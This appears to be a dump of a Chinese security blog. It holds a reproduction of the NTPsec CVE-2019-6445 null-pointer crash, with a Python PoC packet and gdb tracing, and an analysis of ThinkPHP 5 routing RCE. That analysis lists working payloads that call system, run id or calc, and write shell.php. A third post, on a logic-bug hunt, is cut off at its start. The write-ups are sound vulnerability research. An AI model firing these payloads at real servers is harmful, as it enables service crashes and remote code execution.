漏洞复现踩坑1.安装root权限启动buildprep 2.提示没有安装bsion 3.安装更新出错，dhcp 4.安装bison 5.配置configure,设置成允许调试，这里一定要加上编译时的ldflags，不然会报错未定义的引用’_asan_init_v4’ 6.安装asan 7.修改配置文件ntp.conf kyes文件 8.gdb启动调试，报错 复现过程1.ubuntu22换成ubuntu18换成服务器Cento都报错，然后又换成ubuntu18，不过这次找到是的是ntp1.1.2的官方仓库下载的源码：https://github.com/ntpsec/ntpsec/releases/tag/NTPsec_1_1_2 2.解压tar文件tar -zxvf .&#x2F;ntpsec-NTPsec_1_1_2.tar.gz 3.构建准备buildprep 4.编译并且允许对其进行调试.&#x2F;waf configure –enable-debug –enable-debug-gdb 5.查找配置文件位置，启动编译好的文件需要找个选项find &#x2F; -name “ntp.conf” 6.gdb启动并且下断点 sudo gdb –args .&#x2F;build&#x2F;main&#x2F;ntpd&#x2F;ntpd -n -c .&#x2F;packaging&#x2F;SUSE&#x2F;ntp.conf b ctl_getitem r 7.发现已经运行了，端口是123 另外一个终端执行poc，注意是python2 1234567891011#!/usr/bin/env python# note this PoC exploit uses keyid 1, password: gurkaimport sys import socket buf = (&quot;\\x16\\x03\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x6c\\x65\\x61\\x70&quot; + &quot;\\x00\\x00\\x00\\x01\\x5c\\xb7\\x3c\\xdc\\x9f\\x5c\\x1e\\x6a\\xc5\\x9b\\xdf\\xf5&quot; + &quot;\\x56\\xc8\\x07\\xd4&quot;) sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)sock.sendto(buf, (&#x27;127.0.0.1&#x27;, 123)) 8.卡到这里了 rdi指针是空的 9.查看valuep发现指针是空的，这里明显是对空指针进行了引用 10.对源码分析可以发现源码变量valuep在这之前只有两处引用，而且这两次都是经过ctl_getitem函数处理之后，所以ctl_getitem函数有问题 11.为了验证猜想在源码2911行下断点，然后重新执行poc可以看到现在指针非空 通过ni对汇编层面进行调试到ctl_getitem函数 然后ni finish跳出函数，观察valuep的值 由此可以得出确实是ctl_getitem函数导致了空指针的产生 技巧：这里如何对源码和汇编同时进行调试呢？ 通过ni si 对汇编进行调试 通过n s 对源码进行调试 \\12. 对问题函数ctl_getitem进行分析，这次进入函数内部用gdb进行分析 a. 源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162/* \\* ctl_getitem - get the next data item from the incoming packet */ static const struct ctl_var * ctl_getitem( const struct ctl_var *var_list, char **data ) &#123; /* [Bug 3008] First check the packet data sanity, then search \\* the key. This improves the consistency of result values: If \\* the result is NULL once, it will never be EOV again for this \\* packet; If it&#x27;s EOV, it will never be NULL again until the \\* variable is found and processed in a given &#x27;var_list&#x27;. (That \\* is, a result is returned that is neither NULL nor EOV). */ static const struct ctl_var eol = &#123; 0, EOV, NULL &#125;; static char buf[128]; static u_long quiet_until; const struct ctl_var *v; char *cp; char *tp; /* \\* Part One: Validate the packet state */ /* Delete leading commas and white space */ while (reqpt &lt; reqend &amp;&amp; (*reqpt == &#x27;,&#x27; || isspace((unsigned char)*reqpt))) reqpt++; if (reqpt &gt;= reqend) return NULL; /* Scan the string in the packet until we hit comma or \\* EoB. Register position of first &#x27;=&#x27; on the fly. */ for (tp = NULL, cp = reqpt; cp != reqend; ++cp) &#123; if (*cp == &#x27;=&#x27; &amp;&amp; tp == NULL) tp = cp; if (*cp == &#x27;,&#x27;) break; &#125; /* Process payload, if any. */ *data = NULL; if (NULL != tp) &#123; /* eventually strip white space from argument. */ const char *plhead = tp + 1; /* skip the &#x27;=&#x27; */ const char *pltail = cp; size_t plsize; while (plhead != pltail &amp;&amp; isspace((u_char)plhead[0])) ++plhead; while (plhead != pltail &amp;&amp; isspace((u_char)pltail[-1])) --pltail; /* check payload size, terminate packet on overflow */ plsize = (size_t)(pltail - plhead); if (plsize &gt;= sizeof(buf)) goto badpacket; /* copy data, NUL terminate, and set result data ptr */ memcpy(buf, plhead, plsize); buf[plsize] = &#x27;\\0&#x27;; *data = buf; &#125; else &#123; /* no payload, current end --&gt; current name termination */ tp = cp; &#125; /* Part Two * \\* Now we&#x27;re sure that the packet data itself is sane. Scan the \\* list now. Make sure a NULL list is properly treated by \\* returning a synthetic End-Of-Values record. We must not \\* return NULL pointers after this point, or the behaviour would \\* become inconsistent if called several times with different \\* variable lists after an EoV was returned. (Such a behavior \\* actually caused Bug 3008.) */ if (NULL == var_list) return &amp;eol; for (v = var_list; !(EOV &amp; v-&gt;flags); ++v) if (!(PADDING &amp; v-&gt;flags)) &#123; /* Check if the var name matches the buffer. The \\* name is bracketed by [reqpt..tp] and not NUL \\* terminated, and it contains no &#x27;=&#x27; char. The \\* lookup value IS NUL-terminated but might \\* include a &#x27;=&#x27;... We have to look out for \\* that! */ const char *sp1 = reqpt; const char *sp2 = v-&gt;text; /* [Bug 3412] do not compare past NUL byte in name */ while ( (sp1 != tp) &amp;&amp; (&#x27;\\0&#x27; != *sp2) &amp;&amp; (*sp1 == *sp2)) &#123; ++sp1; ++sp2; &#125; if (sp1 == tp &amp;&amp; (*sp2 == &#x27;\\0&#x27; || *sp2 == &#x27;=&#x27;)) break; &#125; /* See if we have found a valid entry or not. If found, advance \\* the request pointer for the next round; if not, clear the \\* data pointer so we have no dangling garbage here. */ if (EOV &amp; v-&gt;flags) *data = NULL; else reqpt = cp + (cp != reqend); return v; badpacket: /*TODO? somehow indicate this packet was bad, apart from syslog? */ numctlbadpkts++; NLOG(NLOG_SYSEVENT) if (quiet_until &lt;= current_time) &#123; quiet_until = current_time + 300; msyslog(LOG_WARNING, &quot;Possible &#x27;ntpdx&#x27; exploit from %s#%&quot; PRIu16 &quot; (possibly spoofed)&quot;, socktoa(rmt_addr), SRCPORT(rmt_addr)); &#125; reqpt = reqend; /* never again for this packet! */ return NULL; &#125; /* \\* control_unspec - response to an unspecified op-code */ /*ARGSUSED*/ static void control_unspec( struct recvbuf *rbufp, int restrict_mask ) &#123; struct peer *peer; UNUSED_ARG(rbufp); UNUSED_ARG(restrict_mask); /* \\* What is an appropriate response to an unspecified op-code? \\* I return no errors and no data, unless a specified association \\* doesn&#x27;t exist. */ if (res_associd) &#123; peer = findpeerbyassoc(res_associd); if (NULL == peer) &#123; ctl_error(CERR_BADASSOC); return; &#125; rpkt.status = htons(ctlpeerstatus(peer)); &#125; else rpkt.status = htons(ctlsysstatus()); ctl_flushpkt(0); &#125; b. 可以看出来这个函数第二个参数是被修改的对象，所以对data进行追踪，这里是二级指针，我们最后是因为valuep的值是0，所以导致原因是*data被赋值成0返回了。调试前valuep的值 再*data引用的位置下断点然后继续跟，发现还是这个值 第一次处理就变成了0 然后在第二个处理的地方下断点发现不会执行，导致了指针为空 往前回溯可以发现因为tp指针被设置成0导致if语句没有被执行，那为什么呢？跟进tp指针，可以发现这里要求字符串有等号，但是没有，通过查看内存十六进制，可以发现就是poc的值没有等号导致的 至此，分析完毕 c. 验证，如果我们在paylaod里面放入”&#x3D;”,是不是就不会触发漏洞呢？真怪，这里把buf随便修改，但凡只要有等号就在gdb停不住，这个确实有点迷惑，等以后水平提高了再来学习 收货点 \\1. 下载官方源码或者换平台，不然容易环境特别难配 \\2. 用gdb调试的时候注意ni n si s p打印变量的混合使用 参考链接 CVE-2019-6445分析复现 - 先知社区 CVE-2019-6445分析 阿里云漏洞库 再理解 我们这里主要分析 source 点 到 sink 点的路径 ，以及程序对数据包如何解析，最终导致了漏洞的触发 bt查看调用链 函数调用链 123456main ntpd.c ：426int main(int argc, char *argv[]) &#123; return ntpdmain(argc, argv); &#125; ntpdmain ntpd.c ：109 守护进程的主函数 static int ntpdmain(int, char **) attribute((noreturn)); \\1. static int: 这里 static 关键字表明 ntpdmain 函数的可见范围仅限于当前文件。这意味着该函数只能在这个文件内部被调用，不能被其他文件中的代码访问。int 表明该函数返回一个整型值。 \\2. ntpdmain: 这是函数的名字。 \\3. (int, char **): 这指定了 ntpdmain 函数接受的参数类型。这里它接受两个参数，第一个是整型，通常用来表示程序启动时的参数个数，第二个是指向字符指针的指针，通常用来传递程序启动时的参数列表。 \\4. attribute((noreturn)): 这是一个编译器属性，它告诉编译器这个函数不会正常返回控制流到调用者。也就是说，一旦进入这个函数，它就会一直运行下去，直到程序终止。通常这样的函数会有一个无限循环或者会调用 exit() 函数来结束整个程序。 mainloop ntpd.c：911 这段代码定义了一个 mainloop 函数，它是 NTP 守护进程的主要循环。这个函数将一直监听和处理网络数据包，直到程序被中断或退出。由于 mainloop 函数不会正常返回，所以调用它的位置之后的任何代码都不会被执行。 1234567891011121314151617181920212223242526272829303132333435/* \\* Process incoming packets until exit or interrupted. */ static void mainloop(void) struct recvbuf *rbuf; rbuf = get_full_recv_buffer(); // 获取一个接收到的数据包 while (rbuf != NULL) &#123; // 当获取到的数据包不为空时 if (sig_flags.sawALRM) &#123; // 检查是否有定时器到期信号 timer(); // 如果有定时器到期信号，处理定时器到期 sig_flags.sawALRM = false; // 清除定时器到期信号标志 &#125; /* \\* Call the data procedure to handle each received packet. */ if (rbuf-&gt;receiver != NULL) &#123; // 检查数据包是否有关联的接收回调函数 \\#ifdef ENABLE_DEBUG_TIMING l_fp dts = pts; dts -= rbuf-&gt;recv_time; // 计算处理延迟 DPRINT(2, (&quot;processing timestamp delta %s (with prec. fuzz)\\n&quot;, lfptoa(dts, 9))); // 输出处理延迟 collect_timing(rbuf, &quot;buffer processing delay&quot;, 1, dts); // 收集处理延迟统计 bufcount++; // 增加缓冲区计数 \\#endif (*rbuf-&gt;receiver)(rbuf); // 调用接收回调函数处理数据包 &#125; else &#123; msyslog(LOG_ERR, &quot;ERR: fatal: receive buffer callback NULL&quot;); // 日志记录：致命错误，接收缓冲区回调函数为空 abort(); // 强制退出程序 &#125; freerecvbuf(rbuf); // 释放接收缓冲区 rbuf = get_full_recv_buffer(); // 获取下一个接收到的数据包 &#125; receive ntp_proto.c：676 这个receive函数就是我们需要分析的重点了，这个就是程序的source点，是我们网络数据包进入程序的地方。 输入来自于一个结构体struct recvbuf 1234567891011121314151617181920212223242526struct recvbuf &#123; recvbuf_t * link; /* next in list */ sockaddr_u recv_srcadr; sockaddr_u srcadr; /* where packet came from */ struct netendpt * dstadr; /* address pkt arrived on */ SOCKET fd; /* fd on which it was received */ l_fp recv_time; /* time of arrival */ void (*receiver)(struct recvbuf *); /* callback */ size_t recv_length; /* number of octets received */ union &#123; struct pkt X_recv_pkt; uint8_t X_recv_buffer[RX_BUFF_SIZE]; &#125; recv_space; #define recv_pkt recv_space.X_recv_pkt #define recv_buffer recv_space.X_recv_buffer struct parsed_pkt pkt; /* host-order copy of data from wire */ int used; /* reference count */ bool keyid_present; keyid_t keyid; int mac_len; #ifdef REFCLOCK bool network_packet; struct peer * recv_peer; #endif /* REFCLOCK */ &#125;; 12345678910111213141516171819202122232425struct recvbuf &#123; recvbuf_t * link; /* next in list */ sockaddr_u recv_srcadr; sockaddr_u srcadr; /* where packet came from */ struct netendpt * dstadr; /* address pkt arrived on */ SOCKET fd; /* fd on which it was received */ l_fp recv_time; /* time of arrival */ void (*receiver)(struct recvbuf *); /* callback */ size_t recv_length; /* number of octets received */ union &#123; struct pkt X_recv_pkt; uint8_t X_recv_buffer[RX_BUFF_SIZE]; &#125; recv_space; #define recv_pkt recv_space.X_recv_pkt #define recv_buffer recv_space.X_recv_buffer struct parsed_pkt pkt; /* host-order copy of data from wire */ int used; /* reference count */ bool keyid_present; keyid_t keyid; int mac_len; #ifdef REFCLOCK bool network_packet; struct peer * recv_peer; #endif /* REFCLOCK */ &#125;; 通过调试我们得到我们发送的数据包存到了这里，一个是解析的结构体，一个是数组，我们来观察这个结构体 12345678910111213141516171819202122232425struct recvbuf &#123; recvbuf_t * link; /* next in list */ sockaddr_u recv_srcadr; sockaddr_u srcadr; /* where packet came from */ struct netendpt * dstadr; /* address pkt arrived on */ SOCKET fd; /* fd on which it was received */ l_fp recv_time; /* time of arrival */ void (*receiver)(struct recvbuf *); /* callback */ size_t recv_length; /* number of octets received */ union &#123; struct pkt X_recv_pkt; uint8_t X_recv_buffer[RX_BUFF_SIZE]; &#125; recv_space; #define recv_pkt recv_space.X_recv_pkt #define recv_buffer recv_space.X_recv_buffer struct parsed_pkt pkt; /* host-order copy of data from wire */ int used; /* reference count */ bool keyid_present; keyid_t keyid; int mac_len; #ifdef REFCLOCK bool network_packet; struct peer * recv_peer; #endif /* REFCLOCK */ &#125;; 时间戳信息： 包含多个时间戳字段，如reftime（最后一次更新时间）、org（起源时间戳）、rec（接收时间戳）和xmt（发送时间戳）。 时钟和精度信息：包含stratum（层次级别）、ppoll（轮询间隔）和precision（时钟精度）等字段，用于描述时间源的质量和状态。 延迟和分散度：包含rootdelay（往返延迟）和rootdisp（分散度）等字段，用于描述到主时间源的延迟和误差。 扩展字段：包含一个名为exten的数组，用于存储认证信息等扩展字段。这些字段可以包含不同长度的消息认证码（MAC），如MD5或SHA哈希值。 内存对齐： 结构体末尾的__attribute__((aligned))确保结构体按照一定的对齐方式进行存储，以优化内存访问速度。 process_control ntp_control.c: 898 漏洞触发的路径中，在receive函数中的数据处理中，数据流向了控制包处理中。 process_control 函数主要用于处理接收到的控制消息。在 NTP（Network Time Protocol）或其他类似协议中，控制消息通常用于管理和监控目的，而不是用于时间同步。这类消息可能包含诊断信息、配置命令或其他管理功能。 12345if(is_control_packet(rbufp)) &#123; process_control(rbufp, restrict_mask); stat_count.sys_processed++; goto done; &#125; 123456789static bool is_control_packet ( struct recvbuf const* rbufp ) &#123; return rbufp-&gt;recv_length &gt;= 1 &amp;&amp; PKT_VERSION(rbufp-&gt;recv_space.X_recv_buffer[0]) &lt;= 4 &amp;&amp; PKT_MODE(rbufp-&gt;recv_space.X_recv_buffer[0]) == MODE_CONTROL; &#125; 12345678/* \\* process_control - process an incoming control message */ void process_control( struct recvbuf *rbufp, int restrict_mask ) 根据函数调用栈，数据所流向了这个函数处理模块，对两个结构体进行分析 1234567891011121314151617/* \\* Look for the opcode processor */ for (cc = control_codes; cc-&gt;control_code != NO_REQUEST; cc++) &#123; if (cc-&gt;control_code == res_opcode) &#123; DPRINT(3, (&quot;opcode %d, found command handler\\n&quot;, res_opcode)); if (cc-&gt;flags == AUTH &amp;&amp; (NULL == res_auth || res_auth-&gt;keyid != ctl_auth_keyid)) &#123; ctl_error(CERR_PERMISSION); return; &#125; (cc-&gt;handler)(rbufp, restrict_mask); return; &#125; &#125; struct ctl_proc 是一个用于存储请求处理程序信息的结构体。它用于定义和组织处理不同控制消息所需的信息。这个结构体在处理控制消息时起到了关键作用，因为它将操作码、标志位和处理函数关联起来，使得程序可以根据接收到的操作码快速定位并执行相应的处理逻辑。 12345678910111213/* \\* Structure to hold request procedure information */ struct ctl_proc &#123; short control_code; /* defined request code */ \\#define NO_REQUEST (-1) unsigned short flags; /* flags word */ /* Only one flag. Authentication required or not. */ \\#define NOAUTH 0 \\#define AUTH 1 void (*handler) (struct recvbuf *, int); /* handle request */ &#125;; static const struct ctl_proc control_codes[] 是一个静态常量数组，用于存储一组预定义的控制消息处理信息。这个数组中的每个元素都是一个 struct ctl_proc 类型的结构体，用于定义控制消息的操作码、标志和处理函数。 12345678910111213static const struct ctl_proc control_codes[] = &#123; &#123; CTL_OP_UNSPEC, NOAUTH, control_unspec &#125;, &#123; CTL_OP_READSTAT, NOAUTH, read_status &#125;, &#123; CTL_OP_READVAR, NOAUTH, read_variables &#125;, &#123; CTL_OP_WRITEVAR, AUTH, write_variables &#125;, &#123; CTL_OP_READCLOCK, NOAUTH, read_clockstatus &#125;, &#123; CTL_OP_WRITECLOCK, NOAUTH, write_clockstatus &#125;, &#123; CTL_OP_CONFIGURE, AUTH, configure &#125;, &#123; CTL_OP_READ_MRU, NOAUTH, read_mru_list &#125;, &#123; CTL_OP_READ_ORDLIST_A, AUTH, read_ordlist &#125;, &#123; CTL_OP_REQ_NONCE, NOAUTH, req_nonce &#125;, &#123; NO_REQUEST, 0, NULL &#125; &#125;; 如果要想数据进入write_variables函数，必须处理以下操作码和操作数 &#123; CTL_OP_WRITEVAR, AUTH, write_variables &#125; 只要是处理这个函数那一定会执行write_variables 函数 (cc-&gt;handler)(rbufp, restrict_mask); write_variables ntp_control.c: 2930 这段代码定义了一个名为 write_variables 的函数，用于处理写入变量的操作。该函数接收两个参数：struct recvbuf *rbufp 和 int restrict_mask。函数的主要任务是从接收到的数据包中解析出变量名和值，并根据这些信息更新系统中的变量。 12345678910/* \\* write_variables - write into variables. We only allow leap bit \\* writing this way. */ /*ARGSUSED*/ static void write_variables( struct recvbuf *rbufp, int restrict_mask ) 12UNUSED_ARG(rbufp); UNUSED_ARG(restrict_mask); 这两行代码用来标记 rbufp 和 restrict_mask 参数在函数内部没有被使用，这是为了满足编译器关于未使用的参数警告的要求。 思考漏洞成因 当然分析到这块可以发现，我们的poc和漏洞的直接触发没有关系，它的作用只是作为一个认证触发漏洞这个函数的条件，这样分析，只是想把数据包的运行过程说明白，以后遇到类似的问题可以知道怎么分析 但是根据我们之前的分析，这个函数指针为空的原因就是没有运行后面的if判断，而导致的直接原因就是数据包的数据内容导致的 12345678/* Scan the string in the packet until we hit comma or \\* EoB. Register position of first &#x27;=&#x27; on the fly. */ for (tp = NULL, cp = reqpt; cp != reqend; ++cp) &#123; if (*cp == &#x27;=&#x27; &amp;&amp; tp == NULL) tp = cp; if (*cp == &#x27;,&#x27;) break; &#125; 这段代码的作用是从接收到的数据包中扫描一段字符串，直到遇到逗号（,）或字符串的末尾（EoB，End of Buffer）。同时，它还会记录第一个等号（&#x3D;）的位置。这样的扫描主要用于解析控制消息中的变量名和值 但是我们在之前的解析当中并没有发现这块的路径，即数据包是如何被传进来的？一下函数都是ntp_control.c 向上分析找到数据的传入点 继续寻找定义 继续跟踪函数定义，解析数据函数，将收到的数据传输到了pkt-&gt;data这段代码定义了一个名为 unmarshall_ntp_control 的函数，其作用是从接收到的数据包中解析出 NTP 控制信息，并将其存储在一个 struct ntp_control 结构体中。这个函数将接收到的数据流转换成结构化的形式，便于后续处理。 在函数中的开始阶段，保存错误响应的地址，已经调用了解析函数 经过调试也可以得到，这里的数据经过复制以后给到了pkt.data的地方 这里面没有逗号导致一直tp一直为空，if条件没有执行，data为空 二维指针导致这里访问空地址 至此我们的数据从source点到sink点的路径一目了然了，下面做梳理路径 1234567// 程序流程 main -&gt; ntpdmain-&gt;mainloop—&gt;receive -&gt; process_control -&gt; unmarshall_ntp_control(pkt_core) -&gt; (pkt=&amp;pkt_core-&gt;reqpt) -&gt; (reqpt=(char *)pkt-&gt;data) -&gt; write_variables -&gt; ctl_getitem // 数据流向 receive -&gt; process_control -&gt; unmarshall_ntp_control(pkt_core) -&gt; (pkt=&amp;pkt_core-&gt;reqpt) -&gt; (reqpt=(char *)pkt-&gt;data) -&gt; write_variables -&gt; ctl_getitem // 漏洞触发 ctl_getitem导致空指针 write_variables引用空指针","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"二进制安全","slug":"二进制安全","permalink":"http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}],"author":"kidder1"},{"title":"ThinkPHP5路由rce漏洞分析","slug":"ThinkPHP5-rce-analysic","date":"2024-09-15T01:33:00.000Z","updated":"2025-07-15T10:56:56.638Z","comments":true,"path":"2024/09/15/ThinkPHP5-rce-analysic/","permalink":"http://example.com/2024/09/15/ThinkPHP5-rce-analysic/","excerpt":"","text":"ThinkPHP5路由rce漏洞分析使用的版本是tp5.0.18 https://github.com/top-think/framework/releases/tag/v5.0.18 https://github.com/top-think/think/releases/tag/v5.0.18 路由分析从index.php开始路由分析，用动态调试的方法来进行路由分析 首先是看index.php 再跟到start.php 补充一下：App通常是应用程序的主要入口类，run方法通常负责启动应用程序的生命周期。这包括初始化配置、设置路由、加载必要的服务和中间件等。send方法通常用于发送最终的响应到客户端。在大多数Web应用框架中，它会输出HTTP响应内容，如HTML、JSON、文件等，并合理设置HTTP头信息。总的来说就是结合起来，这行代码可以解释为，应用通过 App::run() 启动整个应用程序，并在所有处理完成后，通过 send() 方法发送结果到客户端。所以要分析路由的话，我们要跟到run里面去看。 跟到run里面，这里面就是检测请求的地方了，可以看到这里的输入都有request 这里我就不放截图了，放了就过于冗长了，简单审计一下前面的东西。然后直接到重要的这个地方，routeCheck这里就是检测路由的。 因为这个dispatch为null，那我们肯定是可以进入这个逻辑的。 跟进routecheck 可以看到我们的请求路径就在这里被从request请求里面取出来，然后传给了path变量。 然后第二步是从config里面取了个符号/出来，用来后面分割我们的路径 下一步：检测路由，如果self::$routeCheck是null，则从config里面读取配置，默认就为true 然后看有没有路由的缓存文件，有的话，就包含；没有的话，就从配置里面读路由文件的路径，然后包含。简单的讲，就是去包含一个router.php的文件 然后看有没有路由的缓存文件，有的话，就包含；没有的话，就从配置里面读路由文件的路径，然后包含。简单的讲，就是去包含一个router.php的文件 这里的Route::check简单的讲就是看你的url是不是匹配到了router.php里面的路由，如果没有匹配到，就走解析模块/控制器/操作/参数的逻辑去检测url，匹配到了则就这样。 我们这里返回的是false显然是不走这个逻辑的 最后就走到常规的url的检测逻辑了，也就是最后一步。 我们跟进Route::parseUrl去看一看。 跟进去之前我们先理一理之前的逻辑 从index.php-&gt;start.php-&gt;App::run()-&gt;App中的self::routeCheck-&gt;输入的path没在router.php设置的路由中匹配到-&gt;最后进入routeCheck中的Route::parseUrl操作 好现在我们进入Route::parseUrl看一下。看是不是绑定了路由，没绑定就不过第一个逻辑，我们这里没绑定就不会过这个逻辑 下面这里就把url分割开来了，存在path中按竖线分成了数组中的元素。 检测到path存在值之后，就进入下面的解析路由的模块了 然后看是否支持多模块，默认支持，则从path中删除第一个元素，然后将删除的第一个元素传输给module。 module下面的if中$autoSearch是从config里取出的，看设置是否自动搜索控制器，默认为false。所以下面这个if不经过。 走到下面的else里就是挨个从path数组中取出控制器controller，以及操作action，以及操作后面跟的参数 最后两个if逻辑，第一个是看之前绑定的bind里面有没有mudule或者mudule是不是空，如果满足一个条件 -&gt; 则会按照controller/action的方式去看之前有没有绑定。通过这样做，可以确保当前请求的URL不会与已定义的路由规则发生冲突，防止重复定义导致路由处理混乱。 这两个if逻辑正常访问都是直接过，然后最后就return了一个如下图所示的数组出去 再理一下，从index.php-&gt;start.php-&gt;App::run()-&gt;App中的self::routeCheck-&gt;输入的path没在router.php设置的路由中匹配到-&gt;最后进入routeCheck中的Route::parseUrl操作-&gt;parseurl看是否有重复绑定，没有则返回 模块/控制器/操作 的一个数组 最后数组返回出来就简单点看看，只看关键的地方，去看一下在哪里调用类的 回到我们最开始的App::run()这里，通过动态调试，得知了最终调用类和方法的地方在这里，exec exec -&gt; module exec -&gt; module -&gt; Loader::controller exec -&gt; module -&gt; Loader::controller -&gt;class_exists exec -&gt; module -&gt; Loader::controller -&gt;class_exists -&gt;存在就__include_file(看了下就是include) 1exec -&gt; module -&gt; Loader::controller -&gt;class_exists -&gt;存在就__include_file(看了下就是include) -&gt; 刚刚返回true后回到controller 去调用这个class exec -&gt; module -&gt; Loader::controller -&gt;class_exists -&gt;存在就__include_file(看了下就是include) -&gt; 刚刚返回true后回到controller 去调用这个class 最后App.php:343, think\\App::invokeMethod()这里用反射去调用了我们传入的类的方法，而类就是之前获取到的index类。 最后总结一下整个流程就是 index.php-&gt;start.php-&gt;App::run()-&gt;App中的self::routeCheck-&gt;输入的path没在router.php设置的路由中匹配到-&gt;最后进入routeCheck中的Route::parseUrl操作-&gt;parseurl看是否有重复绑定，没有则返回 模块/控制器/操作 的一个数组 -&gt; exec -&gt; module -&gt;Loader::controller -&gt;class_exists -&gt;存在就__include_file(看了下就是include) -&gt; 刚刚返回true后回到controller 去调用这个class -&gt;回到module用is_callable看hello方法能否调用，能调用就直接用反射去调用 -&gt; App.php:331, think\\App::invokeMethod()用反射动态调用构造好的类的路径去调用方法。 简单的讲：如果有controller就直接调用，如果controller传入的方法能调用，就调用。 漏洞点就出来了，如果能调用任意的类，执行任意的方法，就可以rce了，或者就算不是任意类，只要找到一个其他能rce到类就行。 漏洞分析我们回到刚才调用类的地方，如果我们直接传入一个任意类，程序就会默认的给我们拼接为app\\index\\controller\\Evil。这里我们仔细看可以看到，controller传入参数的地方，他其实并没有传入module，只传入了controller也就是我们的Evil类。也就是说路径前面的controller肯定是在这里面自己默认加进去的。 这样就导致我们，只能进入controller文件夹去调用类，而我们需要调用任意的类，就要从这个构造class变量的方法去入手了。也就是getModuleAndClass这个地方，跟进去看一眼，代码分析我就直接写在注释里面。 123456789101112131415161718192021protected static function getModuleAndClass($name, $layer, $appendSuffix)&#123; if (false !== strpos($name, &#x27;\\\\&#x27;)) &#123; // 如果$name中包含命名空间分隔符&#x27;\\&#x27;, 则$name是完整的类名 $module = Request::instance()-&gt;module(); // 获取当前模块名称 $class = $name; // 直接使用$name &#125; else &#123; if (strpos($name, &#x27;/&#x27;)) &#123; // 如果$name中包含&#x27;/&#x27;, 则将模块名称和类名分拆 list($module, $name) = explode(&#x27;/&#x27;, $name, 2); &#125; else &#123; // 如果$name中不包含&#x27;/&#x27;, 当前模块名称为请求的模块名称 $module = Request::instance()-&gt;module(); &#125; // 调用 parseClass 方法生成完整的类名 $class = self::parseClass($module, $layer, $name, $appendSuffix); &#125; return [$module, $class]; // 返回模块名称和完整类名&#125; 可以看到如果name带有\\符号那就回直接返回。现在我们来看看 兼容模式 如果我们直接访问http://127.0.0.1/public/index.php/\\index/\\evil/\\hello的话，http协议就会给我们转义掉了。那就没办法在类名中加入反斜线了，这时候我们就要想到thinkphp的兼容模式。 这里就简单介绍一下，这个兼容模式是默认开启的，并且参数默认也是s。 其作用就是假如访问http://127.0.0.1/public/index.php?s=index/evil/hello，它的效果和http://127.0.0.1/public/index.php/index/evil/hello的效果是一样。用兼容模式去访问的话，就不会被http转义掉我们的反斜线了。 如下 现在我们再去在参数中加入反斜线 成功把app\\index\\controller\\Evil变成\\evil了。 继续 刚才说到，我们已经成功把class变成\\evil了。就是说我们原来只能去controller里面的东西，现在我们已经绕出来了。 为了包含我们想要的rce的类，这里要说一说php反射的一个点。php反射只能操作已经声明的类。这是因为反射是基于运行时的元数据来工作的，如果类尚未声明，自然不存在元数据供反射机制使用。 这里我们就可以在idea的控制台使用get_declared_classes()来获取所有已经声明的类 由于是分析漏洞，我们就不一个一个找了，看这里的一个https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md payload里面用的类来进行分析。 12345?s=index/\\think\\Request/input&amp;filter[]=system&amp;data=pwd?s=index/\\think\\view\\driver\\Php/display&amp;content=&lt;?php phpinfo();?&gt;?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 我们就看最后一个payload吧..因为我试了下上面的好像在这个版本都不成功。 可以看到确实是有这个类的 找到\\think\\app&#x2F;invokefunction。 1234567891011121314public static function invokeFunction($function, $vars = [])&#123; // 使用 ReflectionFunction 类来反射函数 $reflect = new \\ReflectionFunction($function); // 绑定参数，确保传入函数的参数与实际参数匹配 $args = self::bindParams($reflect, $vars); // 如果开启了调试模式，记录函数执行的信息 self::$debug &amp;&amp; Log::record(&#x27;[ RUN ] &#x27; . $reflect-&gt;__toString(), &#x27;info&#x27;); // 使用反射对象调用函数，并传入绑定后的参数 return $reflect-&gt;invokeArgs($args);&#125; 简单的讲就是传入一个$function是函数名，另一个数组里面就是函数的参数。所以到这里就很清晰了。 1?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=calc 就是用call_user_func_array去执行calc来弹计算器就行了。","categories":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/categories/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"}],"tags":[{"name":"公众号推文","slug":"公众号推文","permalink":"http://example.com/tags/%E5%85%AC%E4%BC%97%E5%8F%B7%E6%8E%A8%E6%96%87/"},{"name":"Web安全","slug":"Web安全","permalink":"http://example.com/tags/Web%E5%AE%89%E5%85%A8/"}],"author":"SecureNexusLab"},{"title":"记一次帮朋友扬眉吐气的逻辑漏洞挖掘","slug":"logical-vuln-mining-record","date":"2024-09-09T09:16:00.000Z","updated":"2025-07-15T10:15:40.861Z","comments":true,"path":"2024/09/09/logical-vuln-mining-record/","permalink":"http://example.com/2024/09/09/logical-vuln-mining-record/","excerpt":"","text":"0x00前言 出差刚回酒店，朋友发来消息，我以为是有什么好事情，点开一看，竟然是这么个事情。 当时很累回了一句没时间，出差回家想着不如看一下，就当学习，啪的一下很快啊，地址就发过来点进去一看。 0x01漏洞挖掘 打开站点，抓了个登录包，心凉了半截，全加密又有签名，我这两年半的功力也不够啊。 每次登录加密的密钥都是不一样的。 JS逆向只会一些简单，点开JS看下吧 大致看了一下，大概是这么个意思 key:&#39;_dc&#39;: 定义了一个名为_dc的方法。 value: 